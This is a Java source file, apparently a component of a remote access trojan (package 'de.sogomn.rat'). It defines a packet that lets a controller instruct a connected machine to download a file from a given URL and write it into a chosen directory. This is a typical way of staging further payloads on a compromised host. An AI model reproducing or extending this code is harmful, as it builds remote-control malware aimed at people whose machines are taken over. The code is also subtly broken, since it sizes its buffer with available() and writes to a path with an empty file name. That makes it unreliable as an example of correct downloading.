package de.sogomn.rat.packet;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class DownloadUrlPacket implements IPacket {
	
	private String address, directoryPath;
	
	private static final String HTTP_PREFIX = "http://";
	private static final String FILE_SEPARATOR = "/";
	
	public DownloadUrlPacket(final String address, final String directoryPath) {
		this.directoryPath = directoryPath;
		
		final boolean hasPrefix = address.startsWith(HTTP_PREFIX);
		
		if (hasPrefix) {
			this.address = address;
		} else {
			this.address = HTTP_PREFIX + address;
		}
	}
	
	private byte[] readData(final String address) throws IOException {
		final URL url = new URL(address);
		final HttpURLConnection con = (HttpURLConnection)url.openConnection();
		final Map<String, List<String>> headers = con.getHeaderFields();
		final InputStream in = con.getInputStream();
		final int length = in.available();
		final byte[] data = new byte[length];
		
		headers.keySet().stream().forEach(key -> {
			final List<String> values = headers.get(key);
			
			System.out.print(key + ": ");
			
			for (final String value : values) {
				System.out.print(value + " ");
			}
			
			System.out.println();
		});
		
		in.read(data);
		
		return data;
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(address);
		connection.writeUTF(directoryPath);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		address = connection.readUTF();
		directoryPath = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		try {
			final String path = directoryPath + FILE_SEPARATOR + "";
			final byte[] data = readData(address);
			
			FileUtils.writeData(path, data);
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}
	
}
